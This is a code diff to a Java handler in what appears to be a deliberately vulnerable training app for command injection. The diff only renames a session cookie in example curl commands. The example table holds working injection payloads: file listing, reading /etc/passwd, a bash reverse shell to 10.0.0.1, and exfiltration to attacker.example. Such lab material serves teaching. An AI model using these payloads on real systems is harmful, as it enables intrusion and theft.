@@ -93,16 +93,16 @@ public class RceHandler implements IRouteHandler {
         String exploits = TemplateEngine.exploitBox(new String[][]{
             {"List files", "localhost; ls -la",
              "Appends a second command after the ping. Shows the working directory contents.", "host",
-             "curl -s -X POST http://localhost:8090/rce/vulnerable -b 'JSESSIONID=SESSION' --data-urlencode 'host=localhost; ls -la'"},
+             "curl -s -X POST http://localhost:8090/rce/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode 'host=localhost; ls -la'"},
             {"Read /etc/passwd", "localhost && cat /etc/passwd",
              "Reads the system user file. On Linux servers this reveals all local accounts.", "host",
-             "curl -s -X POST http://localhost:8090/rce/vulnerable -b 'JSESSIONID=SESSION' --data-urlencode 'host=localhost && cat /etc/passwd'"},
+             "curl -s -X POST http://localhost:8090/rce/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode 'host=localhost && cat /etc/passwd'"},
             {"Reverse shell", "localhost; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
              "Opens an outbound TCP connection to the attacker's listener — full interactive shell.", "host",
-             "curl -s -X POST http://localhost:8090/rce/vulnerable -b 'JSESSIONID=SESSION' --data-urlencode 'host=localhost; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"},
+             "curl -s -X POST http://localhost:8090/rce/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode 'host=localhost; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"},
             {"Blind exfiltration", "localhost; curl http://attacker.example/?d=$(whoami)",
              "Exfiltrates command output out-of-band via an HTTP request to an external server.", "host",
-             "curl -s -X POST http://localhost:8090/rce/vulnerable -b 'JSESSIONID=SESSION' --data-urlencode 'host=localhost; curl http://attacker.example/?d=$(whoami)'"},
+             "curl -s -X POST http://localhost:8090/rce/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode 'host=localhost; curl http://attacker.example/?d=$(whoami)'"},
         });
 
         String vulnForm = """
